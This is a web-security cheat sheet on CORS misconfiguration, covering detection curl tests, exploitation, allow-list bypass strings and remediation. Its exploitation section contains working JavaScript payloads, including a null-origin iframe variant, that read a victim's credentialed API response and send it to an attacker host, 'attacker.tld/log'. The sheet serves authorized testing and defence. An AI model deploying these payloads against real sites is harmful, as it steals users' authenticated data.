# CORS Misconfiguration

> Cross-Origin Resource Sharing rules that let any origin read sensitive cross-credentialed responses. Authorized testing only. Map: CWE-942, OWASP WSTG-CONF-07.

## TL;DR
- Browser policy: same-origin reads by default. CORS opt-out is the server saying "this origin may read my response".
- Dangerous combo: `Access-Control-Allow-Origin: <reflected-input>` + `Access-Control-Allow-Credentials: true` → attacker-origin XHR can read authenticated responses.
- `Access-Control-Allow-Origin: *` alone is not credentialed → less dangerous but still leaks anonymous endpoints.
- Defence: explicit allow-list of trusted origins; `null` is never an allow-listed origin; never reflect arbitrary input into `ACAO`.

## Detection / Discovery
```bash
# Test 1: does the server reflect Origin?
curl -i -H "Origin: https://attacker.tld" https://target/api/me
# Look for:
#   Access-Control-Allow-Origin: https://attacker.tld
#   Access-Control-Allow-Credentials: true

# Test 2: does it accept any origin?
curl -i -H "Origin: https://anything.evil.tld" https://target/api/me
# Same headers reflected back → confirmed misconfig

# Test 3: does it accept null origin?
curl -i -H "Origin: null" https://target/api/me
# Some configs allow null; attacker delivers via sandboxed iframe / data: URI
```

## Exploitation

### Origin reflection with credentials
```html
<script>
fetch('https://target/api/me', {credentials: 'include'})
  .then(r => r.text())
  .then(body => fetch('https://attacker.tld/log', {method:'POST', body: body}));
</script>
```
Host on `https://attacker.tld`; trick victim into visiting. Browser sends credentials (cookies / HTTP basic / client cert), server reflects `ACAO: https://attacker.tld` + `ACAC: true`, JS reads response, exfils.

### `null` origin
`null` is the origin of:
- `data:` URIs
- Sandboxed iframes (`<iframe sandbox>`)
- Documents from local file `file://`
- Cross-origin redirects in some browsers (legacy)

If server allows `null`:
```html
<!-- attacker-hosted page -->
<iframe sandbox="allow-scripts" srcdoc='
<script>
fetch("https://target/api/me", {credentials: "include"})
  .then(r => r.text())
  .then(t => fetch("https://attacker.tld/log?d=" + encodeURIComponent(t)))
</script>
'></iframe>
```

### Trusted-subdomain pivot
Allow-list includes `*.target.tld`. Attacker finds XSS or open-redirect on any subdomain → uses that to exfil from the credentialed endpoint.

### Pre-flight bypass with simple requests
`Content-Type: text/plain` / `application/x-www-form-urlencoded` / `multipart/form-data` requests skip the OPTIONS preflight. POST with credentials still goes through; can land state changes even when read is blocked.

## Bypasses
- Server's allow-list is regex `^https?://.*\.target\.tld$` → `https://attacker.tld#.target.tld` may match (regex misses end-anchor / dot-escape).
- Substring match `Origin contains 'target.tld'` → `https://target.tld.attacker.tld/`.
- `Origin: target.tld.attacker.tld` if the server lowercases / strips before compare.
- HTTP/2 lowercases header names → `origin` instead of `Origin` may bypass case-sensitive blocklist (rare).

## Defence / Remediation
- **Strict origin allow-list**: compare the value of `Origin` byte-for-byte with a list of permitted origins; respond with the matched origin verbatim or omit `ACAO`.
- **Never reflect arbitrary `Origin`** into `ACAO`.
- **`Vary: Origin`** when ACAO is dynamic (prevents cache poisoning across origins).
- **Never combine `ACAO: *` with credentials** — browsers will reject anyway, but the misconfig signals lax thinking.
- **Don't allow `null`** — there's no legitimate reason to trust it.
- **Apply CORS only where needed** — APIs that don't serve cross-origin clients shouldn't emit CORS headers at all.
- **Per-route policy**: `/api/public/*` may be open, `/api/me` is locked to explicit allow-list.
- CWE-942 Permissive Cross-domain Policy with Untrusted Domains.

## Sources
- MDN — CORS: https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS
- OWASP WSTG-CONF-07 CORS: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_Cross_Origin_Resource_Sharing
- OWASP Cheat Sheet — HTML5 Security: https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html
- PortSwigger CORS: https://portswigger.net/web-security/cors
- PayloadsAllTheThings CORS Misconfiguration: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration
- HackTricks CORS: https://book.hacktricks.wiki/en/pentesting-web/cors-bypass.html
- CWE-942: https://cwe.mitre.org/data/definitions/942.html
